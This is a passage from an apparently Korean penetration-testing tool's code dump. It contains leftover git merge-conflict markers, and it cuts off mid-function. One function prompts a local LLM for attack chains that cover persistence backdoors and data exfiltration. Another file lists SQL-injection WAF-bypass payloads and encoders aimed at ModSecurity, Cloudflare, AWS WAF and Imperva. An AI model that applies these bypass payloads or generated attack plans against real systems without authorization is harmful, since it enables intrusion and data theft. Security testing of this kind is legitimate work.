        medium_cves = [c for c in cves if isinstance(c, dict) and 4.0 <= c.get("cvss", 0) < 7.0]
        
        cve_summary += f"- 총 CVE: {len(cves)}개\n"
        cve_summary += f"  * Critical (9.0+): {len(critical_cves)}개\n"
        cve_summary += f"  * High (7.0-8.9): {len(high_cves)}개\n"
        cve_summary += f"  * Medium (4.0-6.9): {len(medium_cves)}개\n\n"
        
        # 상위 5개 CVE 상세 정보
        # 딕셔너리인지 확인하고 정렬
        valid_cves = [c for c in cves if isinstance(c, dict)]
        top_cves = sorted(valid_cves, key=lambda x: x.get("cvss", 0), reverse=True)[:5]
        
        cve_summary += "### 주요 취약점 (Top 5):\n"
        for idx, cve in enumerate(top_cves, 1):
            cve_id = cve.get("cve_id", cve.get("id", "N/A"))
            cvss = cve.get("cvss", 0)
            desc = cve.get("description", "")[:150]
            service = cve.get("service", "unknown")
            
            cve_summary += f"{idx}. **{cve_id}** (CVSS {cvss})\n"
            cve_summary += f"   - 서비스: {service}\n"
            cve_summary += f"   - 설명: {desc}...\n\n"
    
    # 3. 검증된 취약점 추가
    verified_info = ""
    if verification_results:
        exploitable = [v for v in verification_results if isinstance(v, dict) and v.get('exploitable')]
        if exploitable:
            verified_info = "\n### 🔥 실제 검증된 취약점:\n"
            for v in exploitable[:5]:
                cve_id = v.get('cve_id', 'N/A')
                endpoint = v.get('endpoint', 'N/A')
                confidence = v.get('confidence', 'unknown')
                verified_info += f"- **{cve_id}**: {endpoint} (신뢰도: {confidence})\n"
    
    # 4. 최종 프롬프트 조합
    prompt = f"""당신은 침투 테스트 전문가입니다. 아래 스캔 결과를 바탕으로 실전적인 공격 시나리오를 한국어로 생성해주세요.

## 타겟 정보
{target_info}

## 발견된 취약점
{cve_summary}
{verified_info}

## 요구사항
다음 단계를 포함하여 상세한 공격 체인(Attack Chain)을 생성해주세요:

1. **초기 침투 (Initial Access)**
   - 어떤 취약점을 이용할 것인지
   - 어떤 공격 기법을 사용할 것인지
   - 예상되는 공격 성공률

2. **권한 상승 (Privilege Escalation)**
   - 초기 침투 후 어떻게 권한을 상승시킬 것인지
   - 사용 가능한 Exploit 또는 기법

3. **지속성 확보 (Persistence)**
   - 재부팅 후에도 접근 가능하도록 하는 방법
   - Backdoor 설치 위치 및 방법

4. **데이터 탈취 (Data Exfiltration)**
   - 어떤 데이터를 탈취할 것인지
   - 탈취 방법 및 은닉 기법

5. **대응 방안 (Mitigation)**
   - 각 공격 단계별 방어 방법
   - 긴급 패치가 필요한 항목

**형식**: Markdown 형식으로, 각 단계를 명확히 구분하여 작성해주세요.
**톤**: 전문적이고 기술적인 어조를 유지하되, 이해하기 쉽게 설명해주세요.
**길이**: 총 300-500 단어 분량으로 작성해주세요.
"""
    return prompt

def get_available_model(base_url):
    """
    Ollama 서버에서 사용 가능한 모델을 자동으로 찾습니다.
    """
    try:
        resp = requests.get(f"{base_url}/api/tags", timeout=2)
        if resp.status_code == 200:
            models = resp.json().get('models', [])
            if models:
                # 1순위: llama3, 2순위: gemma, 3순위: 아무거나
                model_names = [m['name'] for m in models]
                
                for m in model_names:
                    if 'llama3' in m: return m
                for m in model_names:
                    if 'gemma' in m: return m
                
                return model_names[0] # 아무거나 반환
    except Exception:
        pass
    return "llama3" # 기본값

def call_ollama(
    prompt: str,
    model: str = None, # None이면 자동 감지
    base_url: str = "http://localhost:11434",
    timeout: int = 300
) -> str:
    """
    Ollama API 호출 (자동 모델 감지 기능 추가)
    """
    try:
        # 모델 자동 선택 로직
        target_model = model
        if not target_model:
            target_model = get_available_model(base_url)
            logger.info(f"[AI] Auto-detected model: {target_model}")

        url = f"{base_url}/api/generate"
        payload = {
            "model": target_model,
            "prompt": prompt,
            "stream": False,
            "options": {
                "temperature": 0.7,
                "top_p": 0.9,
                "max_tokens": 2000 
            }
        }
        
        logger.info(f"[AI] Calling Ollama API: {url} with model {target_model}")
        
        response = requests.post(url, json=payload, timeout=timeout)
        response.raise_for_status()
        
        result = response.json()
        scenario = result.get("response", "").strip()
        
        if not scenario:
            logger.warning("[AI] Empty response from Ollama")
            return None # None 반환 -> routes.py에서 Fallback 처리
        
        logger.info(f"[AI] ✓ Scenario generated successfully ({len(scenario)} chars)")
        return scenario
        
    except requests.exceptions.Timeout:
        logger.error(f"[AI] Ollama API timeout ({timeout}s)")
        return None
    except requests.exceptions.ConnectionError:
        logger.error(f"[AI] Cannot connect to Ollama at {base_url}")
        return None
    except Exception as e:
        logger.exception(f"[AI] Unexpected error: {e}")
        return None
```
---

## File 44: reporter.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\scenario\reporter.py`
>>>>>>> 6765f0338e4cc09c98a75bde603f7d50bbd85642

```python
# app/core/scenario/reporter.py
# 보고서 생성 모듈
# 기존 loot_generator.py를 기반으로 확장

import random
import datetime
from typing import Dict, Any, List


def enrich_loot(base_proof: Dict[str, Any]) -> Dict[str, Any]:
    """
    LLM이 준 proof에 더미 데이터를 추가하거나 형식을 보정.
    기존 loot_generator.py의 로직을 유지하면서 확장.
    
    Args:
        base_proof: AI가 생성한 proof 딕셔너리
            {
                "loot_files": [...],
                "logs": [...]
            }
    
    Returns:
        보강된 proof 딕셔너리
    """
    proof = base_proof or {}
    loot_files = proof.get("loot_files") or []
    logs = proof.get("logs") or []

    # 기본 /etc/passwd 더미가 없으면 하나 추가
    if not loot_files:
        loot_files.append({
            "path": "/etc/passwd",
            "content": (
                "root:x:0:0:root:/root:/bin/bash\n"
                "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
                "demo:x:1000:1000:demo:/home/demo:/bin/bash\n"
            )
        })

    # 로그에 타임스탬프 추가
    timestamp = datetime.datetime.utcnow().isoformat() + "Z"
    logs.append(f"[{timestamp}] Demo attack simulation completed.")

    proof["loot_files"] = loot_files
    proof["logs"] = logs
    return proof

```
---

<<<<<<< HEAD
## File 44: scorer.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\scorer.py`

```python
# app/core/scorer.py
"""
보안 점수 계산 시스템
A~F 등급 및 위험도 평가
"""

from typing import Dict, List, Any, Tuple


def calculate_security_score(vulnerabilities: List[Dict[str, Any]]) -> Dict[str, Any]:
    """
    취약점 리스트를 기반으로 보안 점수 계산
    
    Args:
        vulnerabilities: CVE 취약점 리스트
        
    Returns:
        {
            'score': int (0-100),
            'grade': str (A~F),
            'risk_level': str (Safe/Low/Medium/High/Critical),
            'severity_counts': dict,
            'recommendations': list
        }
    """
    # 심각도별 카운트
    severity_counts = {
        'CRITICAL': 0,
        'HIGH': 0,
        'MEDIUM': 0,
        'LOW': 0,
        'NONE': 0
    }
    
    # 취약점 분류
    for vuln in vulnerabilities:
        severity = vuln.get('severity', 'NONE').upper()
        if severity in severity_counts:
            severity_counts[severity] += 1
        else:
            severity_counts['NONE'] += 1
    
    # 점수 계산 (100점 만점)
    score = 100
    score -= severity_counts['CRITICAL'] * 20  # Critical: -20점
    score -= severity_counts['HIGH'] * 10      # High: -10점
    score -= severity_counts['MEDIUM'] * 3     # Medium: -3점
    score -= severity_counts['LOW'] * 1        # Low: -1점
    
    # 최소 0점
    score = max(0, score)
    
    # 등급 계산 (A~F)
    if score >= 90:
        grade = 'A'
        risk_level = 'Safe'
    elif score >= 80:
        grade = 'B'
        risk_level = 'Low Risk'
    elif score >= 70:
        grade = 'C'
        risk_level = 'Medium Risk'
    elif score >= 60:
        grade = 'D'
        risk_level = 'High Risk'
    elif score >= 50:
        grade = 'E'
        risk_level = 'Critical Risk'
    else:
        grade = 'F'
        risk_level = 'Severe Risk'
    
    # 권장사항 생성
    recommendations = []
    
    if severity_counts['CRITICAL'] > 0:
        recommendations.append(f"🚨 {severity_counts['CRITICAL']}개의 치명적 취약점을 즉시 패치하세요.")
    
    if severity_counts['HIGH'] > 0:
        recommendations.append(f"⚠️ {severity_counts['HIGH']}개의 높은 위험 취약점을 우선 처리하세요.")
    
    if severity_counts['MEDIUM'] > 3:
        recommendations.append(f"📋 {severity_counts['MEDIUM']}개의 중간 위험 취약점을 검토하세요.")
    
    if score < 70:
        recommendations.append("🔒 WAF(웹 방화벽) 설정을 강화하세요.")
        recommendations.append("🔍 정기적인 보안 스캔을 수행하세요.")
    
    if not recommendations:
        recommendations.append("✅ 현재 보안 상태가 양호합니다. 정기 점검을 유지하세요.")
    
    return {
        'score': score,
        'grade': grade,
        'risk_level': risk_level,
        'severity_counts': severity_counts,
        'recommendations': recommendations,
        'total_vulnerabilities': len(vulnerabilities)
    }


def get_grade_color(grade: str) -> str:
    """등급별 색상 코드 반환"""
    colors = {
        'A': '#28a745',  # Green
        'B': '#5cb85c',  # Light Green
        'C': '#ffc107',  # Yellow
        'D': '#fd7e14',  # Orange
        'E': '#dc3545',  # Red
        'F': '#721c24'   # Dark Red
    }
    return colors.get(grade, '#6c757d')


def get_risk_level_badge(risk_level: str) -> str:
    """위험도별 뱃지 클래스 반환"""
    badges = {
        'Safe': 'success',
        'Low Risk': 'info',
        'Medium Risk': 'warning',
        'High Risk': 'danger',
        'Critical Risk': 'danger',
        'Severe Risk': 'dark'
    }
    return badges.get(risk_level, 'secondary')


def calculate_epss_priority(cve_data: Dict[str, Any]) -> float:
    """
    EPSS(Exploit Prediction Scoring System) 기반 우선순위 계산
    
    Args:
        cve_data: CVE 정보 (cvss, epss 포함)
        
    Returns:
        priority_score: 0.0 ~ 10.0 (높을수록 위험)
    """
    cvss = cve_data.get('cvss', 0.0)
    epss = cve_data.get('epss', 0.0)  # 0.0 ~ 1.0
    
    # CVSS(이론적 위험) 70% + EPSS(실제 공격 확률) 30%
    priority = (cvss * 0.7) + (epss * 10 * 0.3)
    
    return round(priority, 2)


def categorize_by_priority(vulnerabilities: List[Dict[str, Any]]) -> Dict[str, List[Dict]]:
    """
    취약점을 우선순위별로 분류
    
    Returns:
        {
            'immediate': [...],  # 즉시 처리 (CVSS>=7 and EPSS>=0.1)
            'high': [...],       # 높은 우선순위
            'medium': [...],     # 중간 우선순위
            'low': [...]         # 낮은 우선순위
        }
    """
    categorized = {
        'immediate': [],
        'high': [],
        'medium': [],
        'low': []
    }
    
    for vuln in vulnerabilities:
        cvss = vuln.get('cvss', 0.0)
        epss = vuln.get('epss', 0.0)
        
        # 우선순위 계산
        if cvss >= 7.0 and epss >= 0.1:
            categorized['immediate'].append(vuln)
        elif cvss >= 7.0 or epss >= 0.2:
            categorized['high'].append(vuln)
        elif cvss >= 4.0 or epss >= 0.05:
            categorized['medium'].append(vuln)
        else:
            categorized['low'].append(vuln)
    
    return categorized
```
---

## File 45: confidence.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\utils\confidence.py`
=======
## File 45: confidence.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\utils\confidence.py`
>>>>>>> 6765f0338e4cc09c98a75bde603f7d50bbd85642

```python
# app/core/utils/confidence.py
# 결과 신뢰도 스코어링 시스템

import logging
from typing import Dict, Any, List

logger = logging.getLogger(__name__)


def calculate_confidence_score(finding: Dict[str, Any]) -> int:
    """
    발견된 취약점의 신뢰도 계산 (0~100)
    
    가중치 기반 점수 계산으로 개선
    
    Args:
        finding: 발견된 취약점 정보
    
    Returns:
        신뢰도 점수 (0~100)
    """
    # 가중치 정의
    weights = {
        'exploit_verified': 35,
        'multiple_sources': 15,
        'nse_scripts': 12,
        'web_vuln_verified': 20,
        'high_version_accuracy': 8,
        'banner_grabbed': 10
    }
    
    score = 50  # 기본 점수
    
    # 가점 요소 (최대 50점)
    
    # 1. 실제 익스플로잇 검증 완료
    if finding.get("exploit_verified") or finding.get("exploitable"):
        score += weights['exploit_verified']
        logger.debug("익스플로잇 검증 완료: +35점")
    
    # 2. 여러 소스에서 확인
    sources = finding.get("sources", [])
    if isinstance(sources, list) and len(sources) > 1:
        score += weights['multiple_sources']
        logger.debug(f"여러 소스 확인 ({len(sources)}개): +15점")
    elif isinstance(sources, str):
        # 문자열이면 여러 키워드 확인
        source_keywords = ["nse_script", "exploit", "version_match", "banner"]
        found_keywords = sum(1 for keyword in source_keywords if keyword in sources.lower())
        if found_keywords > 1:
            score += weights['multiple_sources']
    
    # 3. NSE 스크립트로 확인
    if finding.get("nse_scripts") or "nse_script" in str(finding.get("sources", "")).lower():
        score += weights['nse_scripts']
        logger.debug("NSE 스크립트 확인: +12점")
    
    # 4. 실제 웹 취약점 테스트로 확인
    if finding.get("vulnerability_test") or finding.get("web_vuln_verified"):
        score += weights['web_vuln_verified']
        logger.debug("웹 취약점 테스트 확인: +20점")
    
    # 5. 버전 정확도
    if finding.get("version") and finding.get("version_accuracy", 0) > 0.8:
        score += weights['high_version_accuracy']
        logger.debug("높은 버전 정확도: +8점")
    
    # 6. 배너 그랩핑으로 확인
    if finding.get("banner") or finding.get("banner_grabbed"):
        score += weights['banner_grabbed']
        logger.debug("배너 그랩핑 확인: +10점")
    
    # 감점 요소 (최대 -40점)
    
    # 1. 단순 버전 매칭만
    detection_method = finding.get("detection_method", "")
    if detection_method == "version_match" and not finding.get("exploit_verified"):
        score -= 25  # 기존 -30에서 -25로 조정
        logger.debug("단순 버전 매칭만: -25점")
    
    # 2. 불확실한 정보
    if finding.get("uncertain") or finding.get("low_confidence"):
        score -= 15  # 기존 -20에서 -15로 조정
        logger.debug("불확실한 정보: -15점")
    
    # 3. 오래된 정보
    if finding.get("old_data") or finding.get("stale"):
        score -= 10
        logger.debug("오래된 정보: -10점")
    
    # 4. 추측 기반
    if finding.get("guessed") or finding.get("assumed"):
        score -= 12  # 기존 -15에서 -12로 조정
        logger.debug("추측 기반: -12점")
    
    # 점수 범위 제한 (0~100)
    score = max(0, min(100, score))
    
    return score


def get_confidence_level(score: int) -> str:
    """
    신뢰도 점수를 레벨로 변환
    
    Args:
        score: 신뢰도 점수 (0~100)
    
    Returns:
        신뢰도 레벨 ("VERY_HIGH", "HIGH", "MEDIUM", "LOW", "VERY_LOW")
    """
    if score >= 80:
        return "VERY_HIGH"
    elif score >= 60:
        return "HIGH"
    elif score >= 40:
        return "MEDIUM"
    elif score >= 20:
        return "LOW"
    else:
        return "VERY_LOW"


def enhance_finding_with_confidence(finding: Dict[str, Any]) -> Dict[str, Any]:
    """
    발견된 취약점에 신뢰도 정보 추가
    
    Args:
        finding: 발견된 취약점 정보
    
    Returns:
        신뢰도 정보가 추가된 취약점 정보
    """
    score = calculate_confidence_score(finding)
    level = get_confidence_level(score)
    
    finding["confidence_score"] = score
    finding["confidence_level"] = level
    
    return finding


def filter_by_confidence(
    findings: List[Dict[str, Any]],
    min_score: int = 40
) -> List[Dict[str, Any]]:
    """
    신뢰도 점수로 필터링
    
    Args:
        findings: 발견된 취약점 리스트
        min_score: 최소 신뢰도 점수
    
    Returns:
        필터링된 취약점 리스트
    """
    filtered = []
    
    for finding in findings:
        # 신뢰도 점수 계산 (없으면 추가)
        if "confidence_score" not in finding:
            finding = enhance_finding_with_confidence(finding)
        
        if finding.get("confidence_score", 0) >= min_score:
            filtered.append(finding)
    
    return filtered


def sort_by_confidence(
    findings: List[Dict[str, Any]],
    reverse: bool = True
) -> List[Dict[str, Any]]:
    """
    신뢰도 점수로 정렬
    
    Args:
        findings: 발견된 취약점 리스트
        reverse: 내림차순 여부 (True면 높은 점수부터)
    
    Returns:
        정렬된 취약점 리스트
    """
    # 신뢰도 점수 계산 (없으면 추가)
    enhanced = [enhance_finding_with_confidence(f) for f in findings]
    
    # 정렬
    sorted_findings = sorted(
        enhanced,
        key=lambda x: x.get("confidence_score", 0),
        reverse=reverse
    )
    
    return sorted_findings

```
---
<<<<<<< HEAD
=======

## File 46: context_filter.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\utils\context_filter.py`

```python
# app/core/utils/context_filter.py
# 컨텍스트 기반 필터링 강화 (False Positive 감소)

import time
import statistics
import logging
from typing import Dict, Any, Optional
import requests
import math

logger = logging.getLogger(__name__)


class ContextFilter:
    """
    컨텍스트 기반 필터링으로 False Positive 감소
    """
    
    def __init__(self, baseline_samples: int = 3):
        """
        Args:
            baseline_samples: 베이스라인 측정 샘플 수
        """
        self.baseline_samples = baseline_samples
    
    def analyze_response_time_variability(
        self,
        baseline_times: list,
        test_time: float,
        threshold: float = 2.0
    ) -> Dict[str, Any]:
        """
        응답 시간 변동성 분석
        
        베이스라인과 비교하여 통계적으로 유의미한 차이인지 확인
        """
        if not baseline_times:
            return {
                "significant": False,
                "reason": "No baseline data"
            }
        
        mean_baseline = statistics.mean(baseline_times)
        std_baseline = statistics.stdev(baseline_times) if len(baseline_times) > 1 else 0
        
        # Z-score 계산
        if std_baseline > 0:
            z_score = abs(test_time - mean_baseline) / std_baseline
        else:
            z_score = abs(test_time - mean_baseline) if mean_baseline > 0 else 0
        
        # 통계적으로 유의미한 차이 (threshold 이상)
        is_significant = z_score >= threshold
        
        return {
            "significant": is_significant,
            "z_score": z_score,
            "mean_baseline": mean_baseline,
            "std_baseline": std_baseline,
            "test_time": test_time,
            "difference": abs(test_time - mean_baseline)
        }
    
    def verify_content_type(
        self,
        baseline_response: requests.Response,
        test_response: requests.Response
    ) -> Dict[str, Any]:
        """
        Content-Type 헤더 검증
        
        응답 타입이 변경되었는지 확인
        """
        baseline_ct = baseline_response.headers.get("Content-Type", "").lower()
        test_ct = test_response.headers.get("Content-Type", "").lower()
        
        # Content-Type이 다르면 의심
        type_changed = baseline_ct != test_ct
        
        # JSON 응답인지 확인
        is_json = "application/json" in test_ct
        
        return {
            "type_changed": type_changed,
            "baseline_content_type": baseline_ct,
            "test_content_type": test_ct,
            "is_json": is_json,
            "suspicious": type_changed
        }
    
    def calculate_entropy(self, text: str) -> float:
        """
        응답 엔트로피 계산
        
        높은 엔트로피 = 랜덤 데이터 (에러 메시지 가능성)
        낮은 엔트로피 = 구조화된 데이터 (정상 응답)
        """
        if not text:
            return 0.0
        
        # 문자 빈도 계산
        char_freq = {}
        for char in text:
            char_freq[char] = char_freq.get(char, 0) + 1
        
        # 엔트로피 계산 (Shannon entropy)
        entropy = 0.0
        text_len = len(text)
        
        for count in char_freq.values():
            probability = count / text_len
            if probability > 0:
                entropy -= probability * math.log2(probability)
        
        return entropy
    
    def analyze_response_entropy(
        self,
        baseline_response: requests.Response,
        test_response: requests.Response,
        threshold: float = 1.5
    ) -> Dict[str, Any]:
        """
        응답 엔트로피 분석
        
        에러 메시지는 보통 엔트로피가 높음
        """
        baseline_entropy = self.calculate_entropy(baseline_response.text)
        test_entropy = self.calculate_entropy(test_response.text)
        
        entropy_diff = abs(test_entropy - baseline_entropy)
        
        # 엔트로피 차이가 크면 의심 (에러 메시지 가능성)
        is_suspicious = entropy_diff > threshold
        
        return {
            "baseline_entropy": baseline_entropy,
            "test_entropy": test_entropy,
            "entropy_difference": entropy_diff,
            "is_suspicious": is_suspicious,
            "threshold": threshold
        }
    
    def comprehensive_verification(
        self,
        baseline_responses: list,
        test_response: requests.Response,
        test_time: float
    ) -> Dict[str, Any]:
        """
        종합 검증
        
        모든 컨텍스트 정보를 종합하여 False Positive 여부 판단
        """
        if not baseline_responses:
            return {
                "verified": False,
                "reason": "No baseline data"
            }
        
        # 베이스라인 통계 계산
        baseline_times = [r.elapsed.total_seconds() for r in baseline_responses]
        baseline_lengths = [len(r.text) for r in baseline_responses]
        baseline_response = baseline_responses[0]  # 대표 응답
        
        # 1. 응답 시간 변동성 분석
        time_analysis = self.analyze_response_time_variability(
            baseline_times,
            test_time
        )
        
        # 2. Content-Type 검증
        content_type_analysis = self.verify_content_type(
            baseline_response,
            test_response
        )
        
        # 3. 응답 엔트로피 분석
        entropy_analysis = self.analyze_response_entropy(
            baseline_response,
            test_response
        )
        
        # 4. 응답 길이 비교
        mean_baseline_length = statistics.mean(baseline_lengths)
        test_length = len(test_response.text)
        length_diff = abs(test_length - mean_baseline_length)
        length_diff_ratio = length_diff / mean_baseline_length if mean_baseline_length > 0 else 0
        
        # 종합 판단
        confidence_score = 0.0
        
        # 시간 차이가 유의미하면 +0.3
        if time_analysis["significant"]:
            confidence_score += 0.3
        
        # Content-Type 변경되면 +0.2
        if content_type_analysis["suspicious"]:
            confidence_score += 0.2
        
        # 엔트로피 차이가 크면 +0.2
        if entropy_analysis["is_suspicious"]:
            confidence_score += 0.2
        
        # 응답 길이 차이가 크면 +0.3
        if length_diff_ratio > 0.1:  # 10% 이상 차이
            confidence_score += 0.3
        
        is_verified = confidence_score >= 0.5  # 50% 이상이면 검증됨
        
        return {
            "verified": is_verified,
            "confidence": confidence_score,
            "time_analysis": time_analysis,
            "content_type_analysis": content_type_analysis,
            "entropy_analysis": entropy_analysis,
            "length_analysis": {
                "baseline_mean": mean_baseline_length,
                "test_length": test_length,
                "difference": length_diff,
                "difference_ratio": length_diff_ratio
            }
        }

```
---

## File 47: encoding.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\utils\encoding.py`

```python
# app/core/utils/encoding.py
# 페이로드 인코딩 다양화 (WAF 우회용)

import base64
import urllib.parse
from typing import List


class PayloadEncoder:
    """
    다양한 인코딩 기법을 제공하는 페이로드 인코더
    """
    
    @staticmethod
    def url_encode(payload: str) -> str:
        """URL 인코딩"""
        return urllib.parse.quote(payload)
    
    @staticmethod
    def double_url_encode(payload: str) -> str:
        """이중 URL 인코딩"""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode 인코딩"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    @staticmethod
    def base64_encode(payload: str) -> str:
        """Base64 인코딩"""
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def hex_encode(payload: str) -> str:
        """Hex 인코딩"""
        return payload.encode().hex()
    
    @staticmethod
    def html_entity_encode(payload: str) -> str:
        """HTML Entity 인코딩"""
        return ''.join(f'&#{ord(c)};' for c in payload)
    
    @staticmethod
    def mixed_case(payload: str) -> str:
        """대소문자 혼합 (SQL 키워드 우회)"""
        result = []
        for i, char in enumerate(payload):
            if char.isalpha():
                result.append(char.upper() if i % 2 == 0 else char.lower())
            else:
                result.append(char)
        return ''.join(result)
    
    @staticmethod
    def comment_injection(payload: str, db_type: str = "mysql") -> str:
        """주석 삽입으로 우회"""
        if db_type == "mysql":
            return payload.replace(" ", "/**/").replace("AND", "/**/AND/**/")
        elif db_type == "mssql":
            return payload.replace(" ", "/**/").replace("--", "/*--*/")
        return payload
    
    @staticmethod
    def get_all_encodings(payload: str) -> List[str]:
        """모든 인코딩 변형 반환"""
        encodings = [
            payload,  # 원본
            PayloadEncoder.url_encode(payload),
            PayloadEncoder.double_url_encode(payload),
            PayloadEncoder.base64_encode(payload),
            PayloadEncoder.hex_encode(payload),
            PayloadEncoder.mixed_case(payload),
            PayloadEncoder.comment_injection(payload, "mysql"),
            PayloadEncoder.comment_injection(payload, "mssql"),
        ]
        return encodings


class WAFBypass:
    """
    WAF별 우회 페이로드 데이터베이스
    """
    
    # ModSecurity 우회
    MODSECURITY_BYPASS = [
        "/*!50000SELECT*/",
        "/*!50000UNION*/",
        "/**/UNION/**/SELECT",
        "UNION/*!50000SELECT*/",
    ]
    
    # Cloudflare 우회
    CLOUDFLARE_BYPASS = [
        "UNION SELECT",
        "UNION/*!50000SELECT*/",
        "UNION ALL SELECT",
        "/*!50000UNION*//*!50000SELECT*/",
    ]
    
    # AWS WAF 우회
    AWS_WAF_BYPASS = [
        "UNION SELECT",
        "UNION/*!50000SELECT*/",
        "UNION/**/SELECT",
    ]
    
    # Imperva 우회
    IMPERVA_BYPASS = [
        "UNION SELECT",
        "UNION/*!50000SELECT*/",
        "UNION/**/SELECT/**/",
    ]
    
    @staticmethod
    def get_bypass_payloads(waf_type: str = None) -> List[str]:
        """WAF 타입별 우회 페이로드 반환"""
        if waf_type == "modsecurity":
            return WAFBypass.MODSECURITY_BYPASS
        elif waf_type == "cloudflare":
            return WAFBypass.CLOUDFLARE_BYPASS
        elif waf_type == "aws":
            return WAFBypass.AWS_WAF_BYPASS
        elif waf_type == "imperva":
            return WAFBypass.IMPERVA_BYPASS
        else:
            # 모든 WAF 우회 페이로드 반환
            return (
                WAFBypass.MODSECURITY_BYPASS +
                WAFBypass.CLOUDFLARE_BYPASS +
                WAFBypass.AWS_WAF_BYPASS +
                WAFBypass.IMPERVA_BYPASS
            )

```
---

## File 48: logger.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\utils\logger.py`

```python
# app/core/utils/logger.py
# 로깅 시스템 설정

import logging
import sys
from pathlib import Path
from typing import Optional

def setup_logger(
    name: str = "scanner",
    log_file: Optional[str] = None,
    level: int = logging.INFO,
    format_string: Optional[str] = None
) -> logging.Logger:
    """
    로거 설정 및 반환
    
    Args:
        name: 로거 이름
        log_file: 로그 파일 경로 (None이면 파일 로깅 안 함)
        level: 로깅 레벨
        format_string: 로그 포맷 문자열
    
    Returns:
        설정된 Logger 객체
    """
    logger = logging.getLogger(name)
    logger.setLevel(level)
    
    # 기존 핸들러 제거 (중복 방지)
    if logger.handlers:
        logger.handlers.clear()
    
    # 기본 포맷
    if format_string is None:
        format_string = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    
    formatter = logging.Formatter(format_string)
    
    # 콘솔 핸들러
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(level)
    console_handler.setFormatter(formatter)
    logger.addHandler(console_handler)
    
    # 파일 핸들러 (지정된 경우)
    if log_file:
        log_path = Path(log_file)
        log_path.parent.mkdir(parents=True, exist_ok=True)
        
        file_handler = logging.FileHandler(log_file, encoding='utf-8')
        file_handler.setLevel(level)
        file_handler.setFormatter(formatter)
        logger.addHandler(file_handler)
    
    return logger


# 기본 로거 인스턴스
default_logger = setup_logger("scanner", log_file="logs/scanner.log")

```
---

## File 49: rate_limit.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\utils\rate_limit.py`

```python
# app/core/utils/rate_limit.py
# Rate Limiting 감지 및 대응

import time
import logging
from typing import Dict, Any, Optional, List
from collections import deque
import requests

logger = logging.getLogger(__name__)


class RateLimitDetector:
    """
    Rate Limiting 감지 및 대응 (지수 백오프 포함)
    """
    
    def __init__(self, max_requests_per_minute: int = 60, base_delay: float = 1.0):
        """
        Args:
            max_requests_per_minute: 분당 최대 요청 수
            base_delay: 기본 딜레이 (초)
        """
        self.max_requests_per_minute = max_requests_per_minute
        self.base_delay = base_delay
        self.request_times = deque(maxlen=max_requests_per_minute)
        self.blocked = False
        self.blocked_until = None
        self.retry_after = 60
        self.consecutive_failures = 0  # 연속 실패 횟수
        self.max_backoff = 300  # 최대 백오프 시간 (5분)
    
    def check_rate_limit(self, response: requests.Response) -> bool:
        """
        Rate Limiting 감지
        
        Args:
            response: HTTP 응답 객체
        
        Returns:
            Rate limit이 감지되었는지 여부
        """
        # HTTP 429 응답
        if response.status_code == 429:
            retry_after = response.headers.get("Retry-After")
            if retry_after:
                try:
                    self.retry_after = int(retry_after)
                except:
                    self.retry_after = 60
            
            self.blocked = True
            self.blocked_until = time.time() + self.retry_after
            self.record_failure()  # 지수 백오프용
            
            logger.warning(f"Rate limited (429). Retry after {self.retry_after}s (backoff: {self.get_wait_time():.1f}s)")
            return True
        
        # WAF 차단 페이지 감지
        waf_indicators = [
            "access denied",
            "blocked",
            "captcha",
            "cloudflare",
            "rate limit exceeded",
            "too many requests",
            "quota exceeded",
            "throttled"
        ]
        
        response_text_lower = response.text.lower()
        if any(indicator in response_text_lower for indicator in waf_indicators):
            logger.warning("Possible WAF/Rate limit detection")
            self.blocked = True
            self.record_failure()  # 지수 백오프용
            # 지수 백오프 시간 사용
            backoff_time = min(
                self.base_delay * (2 ** self.consecutive_failures),
                self.max_backoff
            )
            self.blocked_until = time.time() + backoff_time
            return True
        
        # 응답 헤더에서 Rate Limit 정보 확인
        rate_limit_headers = [
            "X-RateLimit-Remaining",
            "X-RateLimit-Limit",
            "X-RateLimit-Reset"
        ]
        
        for header in rate_limit_headers:
            if header in response.headers:
                remaining = response.headers.get("X-RateLimit-Remaining", "1")
                try:
                    if int(remaining) < 5:
                        logger.warning(f"Rate limit approaching. Remaining: {remaining}")
                        return True
                except:
                    pass
        
        return False
    
    def should_wait(self) -> bool:
        """대기해야 하는지 확인"""
        if not self.blocked:
            return False
        
        if self.blocked_until and time.time() < self.blocked_until:
            return True
        
        # 블록 해제
        self.blocked = False
        self.blocked_until = None
        self.record_success()  # 성공 기록 (백오프 리셋)
        return False
    
    def get_wait_time(self) -> float:
        """
        대기 시간 반환 (초)
        
        지수 백오프 전략 적용
        """
        if not self.blocked_until:
            # 지수 백오프 계산
            if self.consecutive_failures > 0:
                backoff_time = min(
                    self.base_delay * (2 ** self.consecutive_failures),
                    self.max_backoff
                )
                return backoff_time
            return 0.0
        
        wait_time = self.blocked_until - time.time()
        return max(0.0, wait_time)
    
    def record_failure(self):
        """실패 기록 (지수 백오프용)"""
        self.consecutive_failures += 1
    
    def record_success(self):
        """성공 기록 (백오프 리셋)"""
        self.consecutive_failures = 0
    
    def record_request(self):
        """요청 기록"""
        self.request_times.append(time.time())
    
    def get_current_rate(self) -> float:
        """현재 요청 속도 계산 (요청/분)"""
        if not self.request_times:
            return 0.0
        
        current_time = time.time()
        # 최근 1분간의 요청 수
        recent_requests = sum(1 for req_time in self.request_times if current_time - req_time < 60)
        
        return recent_requests

```
---

## File 50: retry.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\utils\retry.py`

```python
# app/core/utils/retry.py
# 재시도 로직 및 지수 백오프 유틸리티

import time
import logging
from functools import wraps
from typing import Callable, Any, Optional

logger = logging.getLogger(__name__)


def retry_with_backoff(
    max_attempts: int = 3,
    initial_delay: float = 1.0,
    max_delay: float = 60.0,
    backoff_factor: float = 2.0,
